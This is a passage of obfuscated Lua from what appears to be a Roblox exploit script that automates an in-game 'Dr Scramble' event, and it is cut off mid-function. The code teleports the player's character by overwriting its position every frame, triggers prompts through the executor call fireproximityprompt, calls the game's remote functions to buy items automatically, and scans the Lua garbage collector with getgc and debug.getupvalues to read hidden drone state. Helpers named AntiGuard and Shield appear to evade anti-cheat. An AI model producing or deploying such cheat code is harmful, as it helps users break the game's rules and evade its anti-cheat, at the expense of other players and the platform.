		local tbl27
		tbl27 = {}

		for _, v16 in ipairs(tbl26) do
			tbl27[#tbl27 + 1] = v16.Label
		end

		local tbl28
		tbl28 = {}
		local tbl29
		tbl29 = {}
		local tbl30
		tbl30 = { Keep = 0, Handle = nil, Picked = { ["Scrambled Mutation"] = true } }
		local snapshot
		snapshot = nil
		local n10
		n10 = -math.huge
		local flag3
		flag3 = false
		local n11
		n11 = 0
		local n12
		n12 = 0
		local str2
		str2 = ""
		local str3
		str3 = ""
		local tbl31
		tbl31 = { Tool = nil, EquipAt = 0 }
		local n13
		n13 = 16
		local flag4
		flag4 = false
		local tbl32
		tbl32 = { Index = 1, Since = 0, Tool = nil }
		local tbl33
		tbl33 = { Latch = false, Ended = false }
		local flag5
		flag5 = false
		local n14
		n14 = 0
		local v16
		v16 = nil
		local fn12

		local function fn13()
			local packages = ReplicatedStorage:FindFirstChild("Packages")
			packages = packages and packages:FindFirstChild("Networking")
			packages = packages and packages:FindFirstChild("RF/Scramble/Request")
			if packages and packages:IsA("RemoteFunction") then
				return packages
			end
			return nil
		end

		fn12 = function(arg, ...)
			local v17 = fn13()
			if not v17 then
				return nil
			end
			local v18 = table.pack(...)

			local ok, result = pcall(function()
				return v17:InvokeServer(arg, table.unpack(v18, 1, v18.n))
			end)

			if not ok or type(result) ~= "table" then
				return nil
			end

			if type(result.Snapshot) == "table" then
				snapshot = result.Snapshot
				n10 = os.clock()
			elseif arg == "Snapshot" and type(result.State) == "table" then
				snapshot = result
				n10 = os.clock()
			end

			return result
		end

		local fn14

		fn14 = function(arg)
			if arg or snapshot == nil or os.clock() - n10 >= n7 then
				fn12("Snapshot")
			end

			return snapshot
		end

		local fn15

		fn15 = function()
			local v17 = snapshot
			return type(v17) == "table" and type(v17.State) == "table" and v17.State or nil
		end

		local fn16

		fn16 = function()
			local v17 = snapshot
			if type(v17) ~= "table" or v17.Enabled == false or type(v17.State) ~= "table" then
				return false
			end
			local num = tonumber(v17.EventEndsAt)
			return num == nil or workspace:GetServerTimeNow() < num
		end

		local fn17

		fn17 = function()
			local v17 = snapshot
			local window = type(v17) == "table" and v17.Window or nil
			if type(window) ~= "table" then
				return false, nil
			end
			local serverTimeNow = workspace:GetServerTimeNow()
			local num = tonumber(window.StartsAt)
			local num2 = tonumber(window.EndsAt)
			local flag6 = window.Active == true

			if not flag6 then
				flag6 = num and num2 and serverTimeNow >= num and serverTimeNow < num2
			end

			if flag6 then
				return true, num2 and math.max(0, num2 - serverTimeNow) or nil
			end
			local num3 = tonumber(window.NextAt)
			return false, num3 and math.max(0, num3 - serverTimeNow) or nil
		end

		local fn18

		fn18 = function(arg, arg2)
			local lostParts = type(arg) == "table" and arg.LostParts or nil
			if type(lostParts) ~= "table" then
				return false
			end

			if lostParts[arg2] then
				return true
			end

			for _, lostPart in pairs(lostParts) do
				if lostPart == arg2 then
					return true
				end
			end

			return false
		end

		local fn19

		fn19 = function(arg)
			local n15 = 0

			for _, v17 in ipairs(tbl25) do
				if fn18(arg, v17) then
					n15 += 1
				end
			end

			return n15
		end

		local fn20

		local function fn21(arg)
			local n15 = math.max(0, math.floor(tonumber(arg) or 0))
			if n15 >= 3600 then
				return string.format("%dh %dm", n15 // 3600, n15 % 3600 // 60)
			end
			return string.format("%dm %ds", n15 // 60, n15 % 60)
		end

		fn20 = function()
			local v17 = fn15()
			if not v17 then
				return "Dr Scramble event is not running"
			end

			if not fn16() then
				return "Dr Scramble event has ended"
			end
			local v18, v19 = fn17()
			local str4

			if v18 then
				str4 = "Outbreak live " .. fn21(v19 or 0)
			else
				str4 = v18
			end

			str4 = str4 or v19 and "Outbreak in " .. fn21(v19) or "Outbreak soon"
			local str5 = v17.Completed == true and "Vault claimed"

			if not str5 then
				str5 = string.format("Lost %d/2  Drone %d/3", fn19(v17), math.min(3, tonumber(v17.DroneParts) or 0))
			end

			if v18 then
				local n15 = 0

				for _, v20 in pairs(tbl28) do
					if (tonumber(v20.Health) or 0) > 0 then
						n15 += 1
					end
				end

				str4 ..= string.format("  %d drones", n15)
			end

			local str6 = string.format("Samples %d  -  %s  -  %s", tonumber(v17.Samples) or 0, str5, str4)

			if str3 ~= "" and tbl4.Toggle(nil, false) then
				str6 ..= "  -  " .. str3
			end

			if str2 ~= "" then
				str6 ..= "  -  " .. str2
			end

			return str6
		end

		local fn22

		fn22 = function()
			return tbl4.Root()
		end

		local fn23

		fn23 = function(arg, arg2, arg3, arg4)
			local n15 = arg4 or 400
			local v17 = fn22()
			if not v17 then
				return false
			end
			arg3 = arg3 or 1
			if (v17.Position - arg).Magnitude <= arg3 then
				return true
			end
			tbl4.Shield("scramble", true)
			local n16 = os.clock() + 6

			while not tbl4.Swapped() and os.clock() < n16 and not arg2() do
				str2 = "Waiting for the character to settle"
				RunService.Heartbeat:Wait()
			end

			local v18 = fn22() or v17
			local character = localPlayer.Character
			tbl4.Driving = tbl4.Driving + 1
			local position = v18.Position
			local flag6 = nil
			local n17 = (arg - position).Magnitude / n15 + 3
			local n18 = 0

			local connection = RunService.Heartbeat:Connect(function(deltaTime)
				if flag6 ~= nil or tbl4.AntiGuard.Busy then
					return
				end
				n18 += deltaTime
				local v19 = fn22()
				if not v19 or arg2() or n18 > n17 or localPlayer.Character ~= character then
					flag6 = false
					return
				end

				if (v19.Position - position).Magnitude > 8 then
					position = v19.Position
				end

				local n19 = arg - position
				local n20 = n15 * deltaTime
				local flag7 = n19.Magnitude <= math.max(n20, arg3)
				position = flag7 and arg or position + n19.Unit * n20
				local vector2 = Vector3.new(n19.X, 0, n19.Z)
				local cframe = vector2.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector2.Unit) or v19.CFrame.Rotation

				pcall(function()
					v19.CFrame = CFrame.new(position) * cframe
					v19.AssemblyLinearVelocity = Vector3.zero
					v19.AssemblyAngularVelocity = Vector3.zero
				end)

				if flag7 then
					flag6 = true
				end
			end)

			while flag6 == nil do
				RunService.Heartbeat:Wait()
			end

			connection:Disconnect()
			tbl4.Driving = math.max(0, tbl4.Driving - 1)
			tbl4.Shield("scramble", false)
			return flag6
		end

		local fn24

		fn24 = function(arg)
			if typeof(arg) ~= "Instance" or not arg:IsA("ProximityPrompt") then
				return false
			end

			local ok = pcall(function()
				arg:InputHoldBegin()
				local n15 = tonumber(type(tbl4.PromptHold) == "function" and tbl4.PromptHold(arg) or arg.HoldDuration) or 0

				if n15 > 0 then
					task.wait(n15 + 0.2)
				end

				arg:InputHoldEnd()
			end)

			if not ok and type(fireproximityprompt) == "function" then
				ok = pcall(fireproximityprompt, arg)
			end

			return ok
		end

		local fn25

		local function fn26()
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("SecretZones")
			return world and world:FindFirstChild("Cave") or nil
		end

		fn25 = function(arg)
			local teleporter = fn26()
			teleporter = teleporter and teleporter:FindFirstChild("Teleporter")
			teleporter = teleporter and teleporter:FindFirstChild(arg)
			teleporter = teleporter and teleporter:FindFirstChild("SecretZonePrompt", true)
			return teleporter and teleporter:IsA("ProximityPrompt") and teleporter or nil
		end

		local fn27

		fn27 = function(arg, arg2)
			arg = arg and arg.Parent
			if arg and arg:IsA("Attachment") then
				return arg.WorldPosition
			end

			if arg and arg:IsA("BasePart") then
				return arg.Position
			end
			return arg2
		end

		local fn28

		fn28 = function()
			local v17 = fn22()
			if not v17 then
				return false
			end
			local position = v17.Position
			local vector2 = Vector3.new(position.X - vector.X, 0, position.Z - vector.Z)
			return position.Y < -60 and vector2.Magnitude < 160
		end

		local fn29

		local function fn30()
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("Areas")
			world = world and world:FindFirstChild("SeparationLine")
			return world and world:IsA("BasePart") and world.Position.X or 552
		end

		fn29 = function(arg)
			if not arg then
				arg = fn22()
				arg = arg and arg.Position
			end

			return arg ~= nil and arg.X < fn30()
		end

		local connection = localPlayer.CharacterAdded:Connect(function()
			tbl4.ScrambleRespawned = true
			tbl31.Tool = nil
			tbl31.EquipAt = 0
		end)

		fn4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)

		local fn31

		fn31 = function(arg, arg2)
			if not fn29() then
				tbl4.ScrambleRespawned = false
				return true
			end

			if arg2 and fn29(arg2) then
				return true
			end

			local function fn32()
				str2 = "Respawned, resting in the safe zone"
				local n15 = os.clock() + 0.75

				while os.clock() < n15 do
					if arg() then
						return false
					end
					task.wait(0.1)
				end

				tbl4.ScrambleRespawned = false
				return true
			end

			local flag6 = type(tbl4.StealHome) == "function" and tbl4.StealHome() or nil
			if not flag6 then
				tbl4.ScrambleRespawned = false
				return true
			end
			local flag7 = tbl4.ScrambleRespawned == true

			if tbl4.DistanceTo(flag6) <= 12 then
				if flag7 then
					return (fn32())
				end
				return true
			end

			str2 = flag7 and "Respawned, easing out through the safe zone" or "Leaving the base through the safe zone"
			local v17 = fn23
			local v18 = v17(flag6 + Vector3.new(0, 3, 0), arg, 3, flag7 and math.min(400, 300) or nil)
			if v18 and flag7 then
				return (fn32())
			end
			return v18
		end

		local fn32, fn33

		do
			local function fn34(arg, arg2, arg3)
				local v17 = fn22()
				if not v17 then
					return false
				end
				tbl4.Shield("scramblefly", true)
				local position = v17.Position
				local flag6 = true

				if Vector3.new(arg.X - position.X, 0, arg.Z - position.Z).Magnitude > 250 then
					local n15 = math.max(position.Y, arg.Y, 98)
					flag6 = fn23(Vector3.new(position.X, n15, position.Z), arg2, 2) and fn23(Vector3.new(arg.X, n15, arg.Z), arg2, 2)
				end

				flag6 = flag6 and fn23(arg, arg2, math.min(arg3, 2))
				tbl4.Shield("scramblefly", false)
				return flag6
			end

			local function fn35()
				local flag6 = type(tbl4.StealHome) == "function" and tbl4.StealHome() or nil
				return flag6 and flag6 + Vector3.new(0, 3, 0) or nil
			end

			fn32 = function(arg, arg2, arg3)
				local n15 = arg3 or 6
				if tbl4.DistanceTo(arg) <= n15 then
					return true
				end
				local v17 = fn29()
				local v18 = fn29(arg)

				if v17 and not v18 then
					if not fn31(arg2, arg) then
						return false
					end
				elseif v18 and not v17 then
					local v19 = fn35()

					if v19 and (v19 - arg).Magnitude > 12 and tbl4.DistanceTo(v19) > 12 then
						str2 = "Coming back through the safe zone"
						if not fn34(v19, arg2, 3) then
							return false
						end
					end
				end

				return fn34(arg, arg2, n15)
			end

			fn33 = function(arg)
				if fn29() or arg() or tbl4.IsNight() or tbl4.WallSealed() then
					return
				end
				local v17 = fn35()

				if v17 then
					str2 = "Coming back through the safe zone"
					fn32(v17, arg, 4)
				end
			end
		end

		local fn34, fn35, fn36

		do
			local function fn37(arg)
				if fn28() then
					return true
				end
				local Entry = fn25("Entry")
				local v17 = fn27(Entry, Vector3.new(2125.7, 73.1, -295.4))
				str2 = "Flying to the Secret Cave"
				if not fn32(v17, arg, 6) then
					return false
				end

				for i = 1, 4 do
					if arg() then
						return false
					end
					str2 = "Entering the Secret Cave"
					fn24(Entry or fn25("Entry"))
					local n15 = os.clock() + 1.5

					while os.clock() < n15 and not fn28() do
						RunService.Heartbeat:Wait()
					end

					if fn28() then
						return true
					end
				end

				str2 = "Cave door missed, flying in"
				local quest = type(snapshot) == "table" and snapshot.Quest or nil
				local position = type(quest) == "table" and type(quest.EscapedExperiment) == "table" and quest.EscapedExperiment.Position or nil

				if typeof(position) == "Vector3" then
					pcall(tbl4.FlyTo, position, arg, "scramble")
				end

				return fn28()
			end

			local function fn38(arg)
				local quest = type(snapshot) == "table" and snapshot.Quest or nil
				local flag6 = type(quest) == "table" and quest[arg] or nil
				local position = type(flag6) == "table" and flag6.Position or nil
				if typeof(position) == "Vector3" then
					return position
				end
				local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
				drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild(arg)
				if drScrambleEvent and drScrambleEvent:IsA("Model") then
					return drScrambleEvent:GetPivot().Position
				end
				return nil
			end

			local function fn39(arg)
				local v17 = snapshot
				local interactions = type(v17) == "table" and v17.Interactions or nil
				return math.max(4, (type(interactions) == "table" and tonumber(interactions[arg]) or 12) - 4)
			end

			fn34 = function(arg)
				local v17 = fn15()
				if not v17 or v17.Discovered == true then
					return true
				end
				local EscapedExperiment = fn38("EscapedExperiment")
				if not EscapedExperiment or not fn37(arg) then
					return false
				end
				str2 = "Talking to the Escaped Experiment"
				if not fn23(EscapedExperiment, arg, fn39("NpcRadius")) then
					return false
				end
				local Discover = fn12("Discover")
				fn14(true)
				return Discover ~= nil and fn15() ~= nil and fn15().Discovered == true
			end

			fn35 = function(arg)
				local v17 = fn15()
				local flag6 = not v17 or v17.Completed == true

				if not flag6 then
					local n15 = #tbl25
					flag6 = fn19(v17) >= n15
				end

				if flag6 then
					return
				end

				if v17.Discovered ~= true and not fn34(arg) then
					return
				end

				for _, v18 in ipairs(tbl25) do
					if arg() then
						return
					end

					if not fn18(fn15(), v18) then
						local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
						drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild(v18)
						drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild("Hitbox", true)
						local claimLostPart = drScrambleEvent and drScrambleEvent:FindFirstChild("ClaimLostPart", true)
						local position = drScrambleEvent and drScrambleEvent:IsA("BasePart") and drScrambleEvent.Position or fn38(v18)

						if position then
							str2 = "Flying to " .. (v18 == "LostPart1" and "Lost Part 1" or "Lost Part 2")

							if fn32(position + Vector3.new(0, 2, 0), arg, 3) then
								str2 = "Collecting the lost part"
								local n15 = position + Vector3.new(0, 2.5, 0)
								local character = localPlayer.Character
								tbl4.Shield("scramble", true)
								tbl4.Driving = tbl4.Driving + 1

								local connection2 = RunService.Heartbeat:Connect(function()
									local v19 = tbl4.Root()
									if not v19 or v19.Parent ~= character or tbl4.AntiGuard.Busy or tbl4.Movement.Owner ~= "scramble" then
										return
									end

									pcall(function()
										local rotation = v19.CFrame.Rotation
										v19.CFrame = CFrame.new(n15) * rotation
										v19.AssemblyLinearVelocity = Vector3.zero
										v19.AssemblyAngularVelocity = Vector3.zero
									end)
								end)

								for i = 1, 4 do
									if not arg() then
										claimLostPart = claimLostPart or drScrambleEvent and drScrambleEvent:FindFirstChild("ClaimLostPart", true)
										fn24(claimLostPart)
										task.wait(0.6)
										fn14(true)
										if not fn18(fn15(), v18) then
											continue
										end
									end

									break
								end

								connection2:Disconnect()
								tbl4.Driving = math.max(0, tbl4.Driving - 1)
								tbl4.Shield("scramble", false)
								if arg() then
									return
								end
								continue
							end
						end
					end
				end
			end

			fn36 = function(arg)
				local v17 = fn15()
				if not v17 or v17.Completed == true then
					return
				end
				local num = tonumber(v17.TotalParts)

				if not num then
					num = fn19(v17) + (tonumber(v17.DroneParts) or 0)
				end

				if num < 5 then
					return
				end
				local ExperimentVault = fn38("ExperimentVault")
				if not ExperimentVault or not fn37(arg) then
					return
				end
				str2 = "Opening the Experiment Vault"
				if not fn23(ExperimentVault, arg, fn39("VaultRadius")) then
					return
				end
				fn12("Vault")
				fn14(true)
				local v18 = fn15()

				if v18 and v18.Completed == true then
					str2 = "Vault opened, The Scrambler unlocked"
				end
			end
		end

		local fn37

		fn37 = function()
			local function fn38(arg)
				if not arg or not arg:IsA("Tool") then
					return false
				end

				if tostring(arg:GetAttribute("ItemType")) ~= "MutationConsumable" then
					return false
				end
				local attribute = arg:GetAttribute("MutationId") or arg:GetAttribute("MutationTemplate")
				if attribute ~= nil then
					return tostring(attribute) == "Scrambled"
				end
				return string.find(string.lower(arg.Name), "scrambled", 1, true) ~= nil
			end

			local character = localPlayer.Character

			if character then
				for _, child in ipairs(character:GetChildren()) do
					if fn38(child) then
						return child, true
					end
				end
			end

			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			if backpack then
				for _, child in ipairs(backpack:GetChildren()) do
					if fn38(child) then
						return child, false
					end
				end
			end

			return nil, false
		end

		local fn38

		fn38 = function(arg, arg2)
			local shopPurchases = type(arg) == "table" and arg.ShopPurchases or nil
			local flag6 = type(shopPurchases) == "table" and shopPurchases[arg2.Id] or nil
			if type(flag6) ~= "table" then
				return 0
			end
			local shopPeriod = type(snapshot) == "table" and snapshot.ShopPeriod or nil
			if flag6.Period ~= nil and shopPeriod ~= nil and flag6.Period ~= shopPeriod then
				return 0
			end
			return tonumber(flag6.Count) or 0
		end

		local fn39

		fn39 = function(arg)
			local v17 = fn14(true)
			if type(v17) ~= "table" or type(v17.Shop) ~= "table" then
				return
			end

			for _, v18 in ipairs(tbl26) do
				if arg() then
					return
				end

				if tbl30.Picked[v18.Label] == true then
					for i = 1, 10 do
						local v19 = snapshot
						local v20 = fn15()
						local v21, v22, v23 = ipairs(type(v19) == "table" and v19.Shop or {})
						local v24 = nil

						for _, v25 in v21, v22, v23 do
							if type(v25) == "table" and v25.Id == v18.Id then
								v24 = v25
							end
						end

						if not (not v24 or not v20 or arg()) then
							local num = tonumber(v24.PurchaseLimit)

							if not (num and fn38(v20, v24) >= num) then
								if not ((tonumber(v20.Samples) or 0) - (tonumber(v24.Price) or math.huge) < tbl30.Keep) then
									local Shop = fn12("Shop", v24.Id, { Quote = v24.Quote, Sequence = tonumber(v20.ShopSequence) or 0 })

									if not (type(Shop) ~= "table" or Shop.Ok ~= true) then
										str2 = "Bought " .. v18.Label
										task.wait(0.4)
										continue
									end
								end
							end
						end

						break
					end
				end
			end
		end

		local n15, n16, n17, tbl34, tbl35, v17, n18, n19, n20, n21
		local fn40, fn41, fn42, fn43, fn44, v18, fn45, fn46, fn47, fn48

		do
			local n22
			n22 = 98
			n15 = 12
			n16 = 20
			n17 = 3

			tbl34 = {
				Vector3.new(2000, 90, -360),
				Vector3.new(2700, 90, -370),
				Vector3.new(3400, 90, -365),
				Vector3.new(4100, 90, -360),
				Vector3.new(4800, 90, -370),
				Vector3.new(5500, 90, -360),
				Vector3.new(5900, 90, -365),
			}

			tbl35 = {}
			local tbl36
			tbl36 = { Link = nil, Goal = nil, Look = nil, Character = nil }
			local fn49

			do
				local userId = localPlayer.UserId
				local tbl37 = {}

				for _, v19 in ipairs({
					{ Label = "Scrap Drone", Tier = "ScrapDrone" },
					{ Label = "Reactor Drone", Tier = "ReactorDrone" },
					{ Label = "Augmented Drone", Tier = "AugmentedDrone" },
				}) do
					tbl37[#tbl37 + 1] = v19.Label
				end

				local tbl38 = { ScrapDrone = true, ReactorDrone = true, AugmentedDrone = true }
				local v19 = ({ "Nearest", "Rare First", "Most HP First" })[1]
				v17 = ({ "Tween", "Teleport" })[1]
				n18 = 110
				n19 = 1.5
				n20 = 0
				n21 = -math.huge

				local function fn50(arg)
					local num = type(arg) == "table" and tonumber(arg.OwnerUserId) or nil
					return num == nil or num == userId
				end

				local function fn51(arg)
					if typeof(arg) == "CFrame" then
						return arg.Position
					end

					if typeof(arg) == "Vector3" then
						return arg
					end
					return nil
				end

				local function fn52(arg, arg2)
					local v20 = networking:FindFirstChild(arg)
					if not v20 or not v20:IsA("RemoteEvent") then
						return
					end

					local connection2 = v20.OnClientEvent:Connect(function(...)
						pcall(arg2, ...)
					end)

					fn4(function()
						pcall(function()
							connection2:Disconnect()
						end)
					end)
				end

				fn52("RE/Scramble/Drones", function(arg)
					if type(arg) ~= "table" then
						return
					end
					local v20 = pairs
					local upserts = type(arg.Upserts) == "table" and arg.Upserts or {}

					for _, upsert in v20(upserts) do
						if type(upsert) == "table" and upsert.Id ~= nil and fn50(upsert) then
							local id = tostring(upsert.Id)
							local attributes = type(upsert.Attributes) == "table" and upsert.Attributes or {}
							local tbl39 = tbl28[id] or {}
							tbl39.Id = id
							tbl39.Position = fn51(upsert.CFrame) or tbl39.Position
							tbl39.Health = tonumber(upsert.Health) or tbl39.Health or 1
							tbl39.Tier = tostring(attributes.ScrambleTier or tbl39.Tier or "")
							tbl39.Area = tostring(attributes.ScrambleArea or tbl39.Area or "")
							tbl39.Seen = os.clock()
							tbl28[id] = tbl39
						end
					end

					local v21 = pairs
					local removed = type(arg.Removed) == "table" and arg.Removed or {}

					for k, v22 in v21(removed) do
						local v23 = tbl28
						local v24 = tostring
						v22 = type(v22) == "string" and v22
						v23[v24(v22 or k)] = nil
					end
				end)

				fn52("RE/Scramble/Effect", function(arg, arg2, arg3)
					if arg ~= "Hit" or type(arg3) ~= "table" or arg3.DroneId == nil then
						return
					end
					local v20 = tbl28[tostring(arg3.DroneId)]
					if not v20 then
						return
					end
					v20.Position = fn51(arg2) or v20.Position
					v20.Health = (tonumber(v20.Health) or 1) - (tonumber(arg3.Amount) or 1)

					if type(arg3.Motion) == "string" and string.find(arg3.Motion, "\"Death\"", 1, true) then
						v20.Health = 0
					end

					if v20.Health <= 0 then
						tbl28[v20.Id] = nil
					end
				end)

				fn52("RE/Scramble/Drops", function(arg)
					local v20 = pairs
					arg = type(arg) == "table" and arg or {}

					for _, v21 in v20(arg) do
						if type(v21) == "table" and v21.Id ~= nil and fn50(v21) then
							local v22 = fn51(v21.Position) or fn51(v21.Origin)

							if v22 then
								tbl29[tostring(v21.Id)] = {
									Position = v22,
									Radius = tonumber(v21.Radius) or 6,
									ExpiresAt = tonumber(v21.ExpiresAt),
									Kind = v21.Kind,
								}
							end
						end
					end
				end)

				fn52("RE/Scramble/State", function(arg)
					if type(arg) ~= "table" then
						return
					end

					if arg.Patch == true and type(snapshot) == "table" then
						for k, v20 in pairs(arg) do
							if k ~= "Patch" then
								snapshot[k] = v20
							end
						end
					elseif type(arg.State) == "table" then
						snapshot = arg
					end

					n10 = os.clock()
				end)

				fn52("RE/Scramble/RemoveDrops", function(arg)
					local v20 = pairs
					arg = type(arg) == "table" and arg or {}

					for k, v21 in v20(arg) do
						local v22 = tbl29
						local v23 = tostring
						v21 = type(v21) == "string" and v21
						k = v21 or k
						v22[v23(k)] = nil
					end
				end)

				fn40 = function(arg)
					local scrambleLocalVisuals = workspace:FindFirstChild("ScrambleLocalVisuals")
					return scrambleLocalVisuals and scrambleLocalVisuals:FindFirstChild("PersonalDrone_" .. arg) or nil
				end

				local v20 = nil
				local n23 = 0

				local function fn53()
					if v20 and next(v20) ~= nil then
						return v20
					end
					v20 = nil
					if os.clock() < n23 or type(getgc) ~= "function" or not fn17() then
						return nil
					end
					n23 = os.clock() + 15

					for _, v21 in ipairs(getgc(false)) do
						if type(v21) == "function" and islclosure(v21) then
							local ok, result = pcall(debug.info, v21, "s")

							if ok and type(result) == "string" and string.find(result, "PersonalDrones", 1, true) then
								local ok2, result2 = pcall(debug.getupvalues, v21)

								if ok2 and type(result2) == "table" then
									for _, v22 in pairs(result2) do
										if type(v22) == "table" then
											local key, v23 = next(v22)
											if type(v23) == "table" and v23.OwnerUserId ~= nil and v23.CFrame ~= nil then
												v20 = v22
												return v22
											end
										end
									end

									continue
								end
							end
						end
					end

					return nil
				end

				local function fn54()
					local v21 = fn53()
					if not v21 then
						return
					end

					for k, v22 in pairs(v21) do
						if type(v22) == "table" and fn50(v22) then
							local str4 = tostring(v22.Id or k)
							local attributes = type(v22.Attributes) == "table" and v22.Attributes or {}
							local tbl39 = tbl28[str4]
							local health = tonumber(v22.Health)

							if not tbl39 then
								tbl39 = { Id = str4 }
								health = health or 1
								tbl39.Health = health
								tbl28[str4] = tbl39
							elseif health then
								tbl39.Health = math.min(health, tonumber(tbl39.Health) or health)
							end

							tbl39.Position = fn51(v22.CFrame) or tbl39.Position
							tbl39.Tier = tostring(attributes.ScrambleTier or tbl39.Tier or "")
							tbl39.Area = tostring(attributes.ScrambleArea or tbl39.Area or "")

							if attributes.DroneState == "Death" then
								tbl39.Health = 0
							end
						end
					end

					for k in pairs(tbl28) do
						if v21[k] == nil then
							tbl28[k] = nil
						end
					end
				end

				fn41 = function()
					pcall(fn54)
					local scrambleLocalVisuals = workspace:FindFirstChild("ScrambleLocalVisuals")
					if not scrambleLocalVisuals then
						return
					end

					for _, child in ipairs(scrambleLocalVisuals:GetChildren()) do
						local attribute = child:GetAttribute("ScrambleDroneId")

						if child:IsA("Model") and attribute ~= nil and string.sub(child.Name, 1, 14) == "PersonalDrone_" then
							local str4 = tostring(attribute)

							if child:GetAttribute("DroneState") == "Death" then
								tbl28[str4] = nil
							elseif not tbl28[str4] then
								local ok, result = pcall(child.GetPivot, child)

								tbl28[str4] = {
									Id = str4,
									Position = ok and result.Position or nil,
									Health = tonumber(child:GetAttribute("Health")) or 1,
									Tier = tostring(child:GetAttribute("ScrambleTier") or ""),
									Area = tostring(child:GetAttribute("ScrambleArea") or ""),
									Seen = os.clock(),
								}
							end
						end
					end
				end

				fn42 = function(arg)
					local v21 = fn40(arg.Id)
					local hitbox = v21 and v21:FindFirstChild("Hitbox")
					if hitbox and hitbox:IsA("BasePart") then
						return hitbox.Position
					end

					if v21 and v21.PrimaryPart then
						return v21.PrimaryPart.Position
					end
					return arg.Position
				end

				fn43 = function()
					local tbl39 = {}
					local now = os.clock()

					for k, v21 in pairs(tbl28) do
						local flag6 = v21.Tier == nil or v21.Tier == "" or tbl38[v21.Tier] == true

						if flag6 then
							flag6 = (tonumber(v21.Health) or 0) > 0
						end

						flag6 = flag6 and v21.Position

						if flag6 then
							flag6 = (tbl35[k] or 0) <= now
						end

						if flag6 then
							tbl39[#tbl39 + 1] = v21
						end
					end

					return tbl39
				end

				fn49 = function()
					local v21 = fn22()
					if not v21 then
						return nil
					end
					local huge = math.huge
					local v22 = nil

					for _, v23 in ipairs(fn43()) do
						local magnitude = ((fn42(v23) or v23.Position) - v21.Position).Magnitude
						local v24 = v19
						local n24

						if v24 == "Rare First" then
							if v23.Tier == "AugmentedDrone" then
								n24 = magnitude - 200000
							elseif v23.Tier ~= "ReactorDrone" then
								n24 = magnitude
							else
								n24 = magnitude - 100000
							end
						elseif v24 == "Most HP First" then
							n24 = magnitude - (tonumber(v23.Health) or 0) * 100000
						else
							n24 = magnitude
						end

						if n24 < huge then
							huge = n24
							v22 = v23
						end
					end

					return v22
				end
			end

			local fn50

			fn50 = function()
				local v19 = fn22()
				if not v19 then
					return nil, nil
				end
				local serverTimeNow = workspace:GetServerTimeNow()
				local huge = math.huge
				local v20 = nil
				local v21 = nil

				for k, v22 in pairs(tbl29) do
					if v22.ExpiresAt and v22.ExpiresAt < serverTimeNow then
						tbl29[k] = nil
					else
						local magnitude = (v22.Position - v19.Position).Magnitude

						if v22.Kind == "Part" then
							magnitude -= 100000
						end

						if magnitude < huge then
							huge = magnitude
							v20 = k
							v21 = v22
						end
					end
				end

				return v20, v21
			end

			fn44 = function()
				if not tbl36.Link then
					if tbl36.SwapWait then
						tbl36.SwapWait = nil
						tbl4.Shield("scramble", false)
					end

					return
				end

				tbl36.Link:Disconnect()
				local v19 = tbl36
				local v20 = tbl36
				local v21 = tbl36
				tbl36.Link = nil
				v19.Goal = nil
				v20.Look = nil
				v21.Character = nil
				local v22 = tbl36
				local v23 = tbl36
				local v24 = tbl36
				local v25 = tbl36
				tbl36.Track = nil
				v22.Dir = nil
				v23.Last = nil
				v24.LastAt = nil
				v25.Vel = nil
				tbl4.Driving = math.max(0, tbl4.Driving - 1)
				tbl4.Shield("scramble", false)
			end

			fn4(fn44)
			local fn51

			fn51 = function(goal, look, track)
				if track ~= tbl36.Track then
					local v19 = tbl36
					local v20 = tbl36
					tbl36.Last = nil
					v19.LastAt = nil
					v20.Vel = nil
				end

				local v19 = tbl36
				local v20 = tbl36
				tbl36.Goal = goal
				v19.Look = look
				v20.Track = track
				local character = localPlayer.Character

				if tbl36.Link and tbl36.Character ~= character then
					fn44()
					local v21 = tbl36
					local v22 = tbl36
					tbl36.Goal = goal
					v21.Look = look
					v22.Track = track
				end

				if tbl36.Link or not character then
					return
				end

				if not tbl4.Swapped() then
					tbl4.Shield("scramble", true)
					tbl36.SwapWait = tbl36.SwapWait or os.clock() + 6
					local swapWait = tbl36.SwapWait
					if os.clock() < swapWait then
						str2 = "Waiting for the character to settle"
						return
					end
				end

				if tbl36.SwapWait then
					tbl36.SwapWait = nil
				else
					tbl4.Shield("scramble", true)
				end

				tbl36.Character = character
				tbl4.Driving = tbl4.Driving + 1

				tbl36.Link = RunService.Heartbeat:Connect(function(deltaTime)
					local v21 = tbl4.Root()
					local goal2 = tbl36.Goal
					if not v21 or not goal2 or v21.Parent ~= tbl36.Character or tbl4.AntiGuard.Busy or tbl4.Movement.Owner ~= "scramble" then
						return
					end
					local position = v21.Position

					if tbl36.Track then
						local ok, last = pcall(tbl36.Track)

						if ok and typeof(last) == "Vector3" then
							local now = os.clock()

							if not tbl36.Last or not tbl36.LastAt then
								local v22 = tbl36
								tbl36.Last = last
								v22.LastAt = now
							elseif (last - tbl36.Last).Magnitude > 0.01 then
								local n23 = math.max(now - tbl36.LastAt, 0.0041666666666666666)
								local n24 = (last - tbl36.Last) / n23

								if n24.Magnitude < 400 then
									local n25 = math.clamp(n23 * 12, 0.2, 0.8)
									tbl36.Vel = tbl36.Vel and tbl36.Vel:Lerp(n24, n25) or n24
								end

								local v22 = tbl36
								tbl36.Last = last
								v22.LastAt = now
							elseif now - tbl36.LastAt > 0.25 and tbl36.Vel then
								tbl36.Vel = tbl36.Vel:Lerp(Vector3.zero, math.clamp(deltaTime * 6, 0, 1))
							end

							local vel = tbl36.Vel or Vector3.zero
							local look2 = tbl36.Last + vel * (math.clamp(now - tbl36.LastAt, 0, 0.25) + 0.1)
							local vector2 = Vector3.new(position.X - look2.X, 0, position.Z - look2.Z)

							if vector2.Magnitude > 0.5 then
								local unit = vector2.Unit
								local n23 = math.clamp(deltaTime * 5, 0, 1)
								local dir = tbl36.Dir and tbl36.Dir:Lerp(unit, n23) or unit
								tbl36.Dir = dir.Magnitude > 0.01 and dir.Unit or unit
							end

